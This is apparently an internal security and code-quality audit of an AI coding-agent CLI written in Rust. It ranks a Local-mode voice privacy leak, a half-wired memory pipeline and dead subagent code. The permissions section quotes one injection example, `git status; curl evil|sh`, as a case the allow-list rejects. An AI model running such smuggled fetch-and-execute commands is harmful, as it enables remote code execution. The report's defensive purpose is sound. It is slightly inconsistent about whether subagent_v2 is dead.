# CLI Surface Inventory Audit — `apps/cli`

Auditor slice: CLI surface (Rust, `apps/cli/src`). Read-only recon. Date: 2026-05-29.
Scope covered: all 165 `.rs` files under `apps/cli/src` (~80,044 LOC). No separate `apps/cli/tests/` directory exists — all tests are inline `#[cfg(test)]` modules.

---

## Purpose & Architecture

`apps/cli` is the terminal coding-agent surface. It ships two binaries — `agi` (default, `src/main.rs`) and `agiworkforce` (`src/bin/agiworkforce.rs`) — both of which are 8-line shims that build a multi-thread Tokio runtime and call `agiworkforce_cli::run_main()`. All real logic lives in the `agiworkforce_cli` library crate (`src/lib.rs`, 2,748 LOC), which is the clap dispatcher / command surface.

Package: `agiworkforce-cli` v1.7.1 (`apps/cli/Cargo.toml`). Strict lints: `unsafe_code = "deny"`, `dead_code = "deny"`, `unused* = "deny"`, `warnings = "warn"`. Depends on 4 first-party crates directly (`agiworkforce-protocol`, `sandbox-policy`, `agiworkforce-command-registry`, `utils-image`) plus the transitive closure noted in the task brief.

High-level module groups:
- **Agent loop** — `src/agent/` (mod.rs 1,498; chat.rs 1,492; executor, history, prompt, tools). The agentic turn loop, tool dispatch, and the privacy/trust-boundary enforcement live here.
- **Providers / models** — `src/models/` (streaming.rs 1,667; provider_dispatch.rs 581; mod.rs, serialization), `src/provider.rs`, `src/model_catalog.rs` (1,765), `src/cloud.rs`, `src/routing/`. 10+ providers (Anthropic, OpenAI, Google, Mistral, xAI, DeepSeek, Moonshot/Kimi, Zhipu/GLM, Qwen, Ollama/LM Studio, OpenAI-compatible, Custom).
- **Auth** — `src/auth.rs` (1,429), `src/auth_oauth.rs`, `src/oauth.rs`, `src/mcp/oauth_flow.rs`, `mcp/oauth_store.rs`.
- **Permissions / safety / sandbox** — `src/permissions.rs` (622), `src/safety/` (mod.rs 1,151; dangerous_commands.rs; approval.rs), `src/sandbox.rs` (531), `src/path_security.rs`, `src/exec_policy.rs`, `src/platform/policy/` (per-OS sandbox).
- **Tools / exec** — `src/features/exec/tools/` (mod.rs 1,289; file_ops 901; task_registry 880; web 385; bash 191; dir_ops 355; git 122; common 263), `src/notebook_edit.rs`, `src/powershell_tool.rs`, `src/apply_patch.rs`.
- **Hooks / plugins / skills / MCP** — `src/features/hooks/hooks.rs` (2,092), `src/features/plugins/plugins.rs` (793), `src/skills.rs` (917), `src/skill_learner.rs`, `src/mcp/` (mod.rs 2,499 + http/sse/oauth/elicitation/resources).
- **Sessions / memory / conversations** — `src/sessions.rs` (895, atomic writes), `src/conversations.rs` (775), `src/memory.rs` (868), `src/memory_pipeline.rs` (692), `src/compaction.rs` (1,240), `src/platform/runtime/session*.rs`.
- **TUI (ratatui)** — `src/tui/` 8 declared submodules + `widgets/` (tui_app.rs 2,877; screen_renderers 1,342; model_picker, approval_overlay, elicitation_overlay, etc.).
- **REPL** — `src/repl/` (registry 998; mod 625; slash_commands 552; dialogs 128).
- **Daemon / servers** — `src/daemon.rs` (1,317, webhook listener), `src/app_server.rs`, `src/features/a2a/` (agent-to-agent), `src/a2a_ws.rs`.
- **Misc** — `src/voice.rs` (813), `src/onboarding.rs`, `src/doctor.rs`, `src/ecosystem.rs` (1,605), `src/marketplace.rs`, `src/teams.rs`, `src/sync.rs`, `src/claude_parity.rs` (1,284), `src/errors.rs` (936).

---

## Alive vs Dead

The crate compiles with `dead_code = "deny"`, so genuinely unreferenced top-level items would fail the build. Verified reachability of the security-critical paths from `run_main()`. Notable findings:

- **ALIVE & central**: agent loop (`agent/mod.rs`, `agent/chat.rs`) reached from `lib.rs` dispatch and the REPL; all three tool-execution branches (sequential, concurrent batch, task-subagent) in `chat.rs`; permissions, safety, sandbox; provider dispatch + streaming; auth; MCP; hooks; TUI (`tui_app.rs`); daemon; voice (`/voice` slash command at `repl/mod.rs:183`).
- **DEAD / NOT WIRED — `platform::policy` (PHASE2 declarative TOML tool-rule policy engine)**: `platform/mod.rs:12` carries `#[allow(dead_code)] // PHASE2: Gemini-style declarative TOML tool-rule eval not yet wired into agent`. The `policy/engine.rs` (263 LOC) + per-OS sandbox installers exist but the eval is not invoked by the agent loop. Honestly labeled; kept alive only via `#[allow(dead_code)]` on the module. Not a security gap (nothing claims it is enforcing).
- **HALF-BUILT — memory pipeline Phase 1 (`extract_session_summary`)**: defined in `memory_pipeline.rs:52` but **never called from production code** — the only caller is a unit test (`memory_pipeline.rs:675`). Nothing writes to `~/.agiworkforce/memories/session_summaries/`, so Phase 2 `consolidate` (the only wired phase, `chat.rs:1341`) operates on an empty directory and early-returns at lines 175-177. The module docstring advertises a "2-Phase Memory Extraction Pipeline" but only the consolidation half + `load_persistent_memory`/`needs_consolidation` are live. Effectively inert in production. See P2 below.
- **PLACEHOLDER scaffolding (documented, harmless)**: `features/{providers,mcp,repl,session,tui}/mod.rs` and `data/mod.rs` are empty Phase-6-reorg migration targets with doc comments; the live implementations remain at the crate root. Mild clutter, not broken.
- **Marketplace registry**: production code uses `Marketplace::new_production()` → `https://registry.agiworkforce.com/plugins/v1` (`marketplace.rs:75,147`), NOT the `Default` placeholder (`MARKETPLACE_PLACEHOLDER_URL`, only used in tests). Whether that domain is live is an ops/deploy concern, not a code defect.

---

## Test Coverage

- 104 of 165 `.rs` files (~63%) contain `#[cfg(test)]` modules; ~1,507 `#[test]`/`#[tokio::test]` functions; 12 insta `.snap` snapshots under `tui/widgets/snapshots/`.
- Strong coverage on the security-critical paths: `permissions.rs` (CLI-PERM-01 cases at lines 512-560), `agent/chat.rs` PreToolUse hook cases (CLI-HOOK-01 at 1453-1489), `agent/mod.rs` privacy-boundary cases (1287-1346), `safety/mod.rs` command classification, `daemon.rs` token/secret-redaction, `memory_pipeline.rs` local-only-stays-on-device (664).
- **Notable test gaps**: `voice.rs` (813 LOC) has **zero tests** — including the privacy backend-selection logic (the P1 below). `repl/registry.rs` (998), `features/plugins/plugins.rs` (793), `onboarding.rs` (773), `mcp/http.rs` (556), `features/a2a/server.rs` (434), `app_server.rs` (236) lack inline test modules. Many are UI/IO-heavy where unit tests are hard, but the voice gap is material given the leak risk.

---

## Panic / Crash sites

Counts (whole tree): `panic!` 30, `.unwrap()` 806, `.expect(` 182, `todo!`/`unimplemented!`/`unreachable!` **0**.
After excluding everything at/after the first `#[cfg(test)]` in each file, **non-test** counts collapse to ~28 unwrap, ~22 expect, **1 panic** — i.e. the overwhelming majority are in tests. This is a healthy posture for 80K LOC.

Non-test panic-class triage:
- `model_catalog.rs:71` — the only non-test `panic!`. Fires only if `legacy_bundled_models()` is empty, which is impossible: `models.json` is `include_str!`'d at compile time (`model_catalog.rs:32`). Genuine programmer-error invariant, well-documented. **Not user-reachable.**
- `model_catalog.rs:1564,1574` — `panic!` inside `#[cfg(test)]` assertions. Test-only.
- `daemon.rs:1013-1039` — 12 `Regex::new(<literal>).unwrap()` for the secret-redaction patterns. All on compile-time-constant regexes; cannot fail at runtime. **Genuine invariants, safe.**
- `task_registry.rs:67,167,189,241,304,355,405,534,564` — `RwLock::read()/write().unwrap()` on the global session registry. These panic only on lock poisoning (a prior panic while holding the lock). Standard Rust pattern; technically user-reachable only after another thread already panicked. Low risk; could be hardened to `unwrap_or_else(|p| p.into_inner())` like `permissions.rs:53` does. P3.
- `task_registry.rs:145,450,513` — `.unwrap()` on time/serialization in non-test paths; low risk.
- `agent/chat.rs:683` — `.expect("subagent_manager was just initialized above")` — genuine local invariant (the field is set 30 lines above in the same function). Safe.
- `marketplace.rs:142` — `reqwest::Client::builder()...build().unwrap_or_default()` — falls back, does not panic. Safe.

No `.unwrap()`/`panic!` found on a common user-input path that would crash the agent in normal operation.

---

## TODO / FIXME / HACK

Only 11 matches across the tree, all benign: `output_styles.rs:57` (a feature *description* mentioning "TODO(human)"), `tool_catalog.rs:464,469` and `task_registry.rs:627,638,682` (the `TodoWrite`/`TodoRead` tool + `TODO_STORE`), `chat.rs:1479,1489` (test fixtures referencing `TODO.md`), `sdk_io/ndjson.rs:11,20` (`\uXXXX` escape docstrings). No real `FIXME`/`HACK` debt markers. The PHASE2 "not yet wired" notes (`lib.rs:105`, `platform/mod.rs:12`) are tracked dead-code labels, not TODOs.

---

## Security-sensitive code

**Trust-boundary enforcement (PRIVACY-01) — mostly solid, one live gap.**
- `agent/mod.rs` defines `PrivacyMode {Local, Byok, Managed}` and `provider_privacy_mode()` (861-877): Ollama-local and keyless localhost OpenAI-compatible/Custom URLs map to `Local`; everything else maps to `Byok`. Fails closed (unknown → Byok). `is_local_provider_url` (878) matches only `http://localhost|127.|[::1]|0.0.0.0` — conservative; `https://localhost` and LAN IPs are treated as non-local (safe direction).
- `validate_privacy_boundary()` (`agent/mod.rs:560`) bails if a `Local` session would route to a non-local provider. It is enforced at the single entry to the agentic loop — `agent/chat.rs:69`, the first line of `AgentSession::send()`. Subagents (`subagent.rs:385` `run_subagent`) reuse `AgentSession::send()` and inherit the gate. The daemon (`daemon.rs:874`) also uses `AgentSession::new().send()` → gated.
- Memory pipeline respects Local mode: `consolidate(local_only)` (`chat.rs:1339-1344`) and `extract_session_summary(local_only)` both fall back to on-device deterministic summaries with no network when `local_only` is true (`memory_pipeline.rs:78-101,168-171`), and a test asserts this (664).
- **GAP (P1): voice transcription bypasses the privacy boundary.** `voice::run_voice_mode(session, ...)` (`voice.rs:71`) receives the session (with its `privacy_mode`) but `detect_backend()` (`voice.rs:272`) selects the backend purely on `OPENAI_API_KEY` presence — "Priority: OpenAI API (if key set) > local binary > none" (`voice.rs:271`). In a **Local** session, if `OPENAI_API_KEY` is set, recorded audio is uploaded to `https://api.openai.com/v1/audio/transcriptions` (`voice.rs:721`) and the transcript fed into the session — a silent Local→cloud egress of voice data, violating the locked never-silent-egress invariant. There is no `privacy_mode` check anywhere in `voice.rs`. The `stream_completion` direct callers below (advisor, subagent_v2) share the same class of risk but are lower-traffic / dev paths.

**Direct `stream_completion` callers that bypass `validate_privacy_boundary()`** (the gate lives in `send()`, not in the HTTP layer `models/streaming.rs:180`): `memory_pipeline.rs:145,276` (guarded by `local_only`), `subagent_v2.rs:473`, `platform/runtime/advisor.rs:90`. Memory is guarded. `subagent_v2` is **dead code** — declared at `lib.rs:54` but never dispatched (verified: no caller outside its own file), so its bypass is not user-reachable. **`advisor` IS reachable**: `runtime::advisor::consult` is invoked by an agent tool at `features/exec/tools/task_registry.rs:603-604`, so the model can call the advisor tool and send the question to a cloud provider even in a Local session — a live secondary egress gap (lower-traffic than voice). It checks for an API key and bails without one, but does not check `privacy_mode`. See P2.

**Command execution / sandbox.** `features/exec/tools/bash.rs` runs commands via `sh -c`, but sandboxing is on by default on macOS/Linux (`bash.rs:92-105`: refuses to run on platforms without sandbox support unless `AGIWORKFORCE_NO_SANDBOX=1`; uses `SandboxManager::full_auto` + `execute_sandboxed`). `safety/dangerous_commands.rs` maintains read-only SAFE_COMMANDS (with a documented SEV-CLI-LOW-1 fix removing `env`/`printenv` to avoid dumping API keys) and DANGEROUS classifications including `eval`/`source`. `permissions.rs` implements token-prefix matching with shell-metachar rejection (AUDIT-FIX C-2 at line 7) so `git status; curl evil|sh` cannot slip past a `git status` allow (CLI-PERM-01 verified, tests 512-560). Lock access is poison-tolerant (`permissions.rs:50-55`).

**Network listeners.** `daemon.rs` webhook server binds `127.0.0.1` only (line 529), **requires** a ≥32-char `webhook_token` when triggers are configured (HIGH-3 fix, lines 228-241), uses constant-time token comparison (`constant_time_eq`, line 30), rate-limits 60 req/min, and wraps webhook bodies in prompt-injection quarantine delimiters. `features/a2a/server.rs` binds `127.0.0.1` (line 77), constant-time Bearer check (line 180). `app_server.rs` defaults `127.0.0.1:8787` (line 113). No `0.0.0.0` bind found in these servers.

**Secret handling.** `daemon.rs:1009-1042` redacts a broad set of API-key/token formats (Anthropic, OpenAI, Google, Groq, Stripe, AWS, GitHub, xAI, bearer, DB connection strings) before logging. No hardcoded secrets in non-test code (only `auth.rs:1250` `"0123456789abcdef"` test fixture). API keys are read from env / keyring (`keyring = "2"` dep).

**Voice audio file** is read and POSTed as multipart (`voice.rs:709-727`); no obvious temp-file cleanup issue observed but not deeply audited.

---

## AI-slop

- **Dual subagent implementations, one dead**: `subagent.rs` (590, the wired one via `chat.rs:652`) and `subagent_v2.rs` (804, with its own `ProviderLlmCaller` → `stream_completion` at 473). `subagent_v2` is **never dispatched** (only `lib.rs:54` mod decl references it) — ~804 LOC of dead duplicated agent-spawn logic that survives the `dead_code = "deny"` lint because its items are `pub`. Remove or wire it.
- **Empty Phase-6 placeholder modules** (`features/*/mod.rs`, `data/mod.rs`) — scaffolding with no code; documented but clutters the module tree.
- **Memory pipeline 2-phase claim vs 1-phase reality** (see Alive/Dead + P2) — docstring overstates what's wired.
- `model_catalog.rs:15` `#![allow(dead_code, unused_imports)]` and `cloud.rs:1` same — file-level allow attributes that mask unused code in two large modules despite the crate-wide `dead_code = "deny"`. Worth auditing for genuinely dead helpers.
- No hallucinated/nonexistent provider APIs found — all base URLs in `models/mod.rs:73-145` are real provider endpoints; `provider_dispatch::detect_provider` covers all 10+ providers with sensible prefixes.

---

## Broken / half-built features

| Feature | Status | Evidence |
| --- | --- | --- |
| Voice in Local mode | Privacy leak (works, but leaks) | `voice.rs:272` `detect_backend()` ignores `session.privacy_mode`; uploads to OpenAI if key set even in Local. |
| Memory Phase-1 extraction | Dead — never called in prod | `extract_session_summary` only caller is a test (`memory_pipeline.rs:675`); nothing writes `session_summaries/`, so Phase-2 consolidate runs on empty dir. |
| Declarative TOML tool-rule policy engine | Not wired | `platform/mod.rs:12` `// PHASE2 ... not yet wired into agent`; `platform/policy/engine.rs` unused by the loop. |
| subagent_v2 | Dead — declared, never dispatched | `subagent_v2.rs` exists alongside the wired `subagent.rs`; only referenced by `lib.rs:54` mod decl, no caller. ~804 LOC of unreachable parallel agent-spawn logic. |

No dead buttons or empty UI shells found in the TUI widgets sampled; the orphan TUI tree (CLI-TUI-ORPHAN-01) was already removed in `e3a316d39` and `tui/mod.rs` declares exactly the 8 expected submodules.

---

## Severity-ranked issues

### P1
1. **Voice transcription silently routes Local-mode audio to OpenAI cloud.** `apps/cli/src/voice.rs:272` (`detect_backend`), reachable via `/voice` → `voice.rs:71` `run_voice_mode(session,...)` → `voice.rs:721` POST to `api.openai.com`. The session's `privacy_mode` is available but never consulted; if `OPENAI_API_KEY` is set, a `Local` session's microphone audio is uploaded to a cloud provider with no consent prompt or provider label — violates PRIVACY-01 / never-silent-egress lock. *Fix*: have `detect_backend()` take `privacy_mode`; in `Local` mode require/prefer the local `whisper`/`whisper-cpp` binary and refuse the API backend (or force an explicit fork-style consent). Add a regression test (voice.rs currently has none).

### P2
2. **Memory pipeline is half-wired (inert in production).** `apps/cli/src/memory_pipeline.rs:52` `extract_session_summary` has no production caller (only test at :675), so the advertised 2-phase pipeline never produces session summaries and Phase-2 consolidation has nothing to consolidate. Users get no learned memory despite the feature appearing implemented. *Fix*: call `extract_session_summary` from the session-end path in `agent/chat.rs` (alongside the existing skill-learner + consolidate calls ~lines 1316-1348), threading `local_only = privacy_mode == Local`; or remove the dead Phase-1 code and correct the docstring.
3. **Advisor tool can egress to cloud from a Local session.** `apps/cli/src/platform/runtime/advisor.rs:90` calls `models::stream_completion` directly, and `consult` is reachable as an agent tool via `apps/cli/src/features/exec/tools/task_registry.rs:603-604`. It checks for an API key but never checks `privacy_mode`, so a Local-mode session's advisor question is sent to a cloud provider with no boundary check. Lower-traffic than the voice path but still a live PRIVACY-01 gap. (`subagent_v2.rs:473` shares the bug class but is dead code — `lib.rs:54` declares the module yet nothing dispatches it, so it is not currently reachable.) *Fix*: assert `validate_privacy_boundary()`/`privacy_mode` in `advisor::consult` before egress, ideally moving the boundary check closer to `models::stream_completion` as defense-in-depth.

### P3
4. **`RwLock`/`Mutex` `.unwrap()` on poison in the global task registry.** `apps/cli/src/features/exec/tools/task_registry.rs:67,167,189,241,304,355,405,534,564`. Will panic if a thread panics while holding the lock; `permissions.rs:50-55` already shows the poison-tolerant pattern to copy. Low likelihood, easy hardening.
5. **Two subagent implementations** (`subagent.rs` vs `subagent_v2.rs`) — duplicated logic; mark one canonical or merge. Maintenance/clarity.
6. **File-level `#![allow(dead_code, unused_imports)]`** in `model_catalog.rs:15` and `cloud.rs:1` mask unused code despite crate-wide `dead_code = "deny"`. Audit for genuinely dead helpers and remove the blanket allow.
7. **`conversations.rs:131` non-atomic `fs::write`** for conversation files (sessions.rs uses atomic tempfile+rename+flock; conversations does not). A crash mid-write could corrupt a single conversation JSON. Error is propagated, not silent. Consider the same atomic-write helper.
8. **Marketplace targets `registry.agiworkforce.com`** (`marketplace.rs:75`) — verify the domain/registry is live before launch or the `/marketplace` commands will fail at runtime. Ops/deploy gap, not a code bug.

---

## Open questions / Uncertainty

- I did not exhaustively read every line of the two largest modules (`mcp/mod.rs` 2,499; `tui/tui_app.rs` 2,877; `hooks/hooks.rs` 2,092) — I verified their reachability, entry points, and the security-relevant slices (hook block/stop enforcement, MCP OAuth presence) but a deep correctness review of MCP transport handling and TUI rendering was out of scope for this pass.
- Whether `subagent_v2` is actually invoked anywhere in production (I found its `stream_completion` call but did not confirm a live dispatch from `lib.rs`/REPL). If it is dead, the P2 #3 concern downgrades.
- I did not verify the actual on-disk behavior of the voice leak (no runtime execution per instructions) — the finding is from static reading of `detect_backend()` + the `/voice` call path. The conclusion that `privacy_mode` is never consulted is high-confidence (no `privacy`/`Local` reference exists in `voice.rs` outside the local-binary backend naming).
- `is_local_provider_url` not matching `https://localhost` or LAN IPs is conservative (fails to Byok = safe), but means a user running a genuinely local HTTPS inference server would be incorrectly blocked in Local mode — a usability edge, not a security hole.
- Test pass/build status not run (instructed not to build). Counts are static estimates; the non-test panic split is a heuristic (lines before first `#[cfg(test)]`) and may slightly under/over-count files with multiple inline test fns interleaved (rare here).
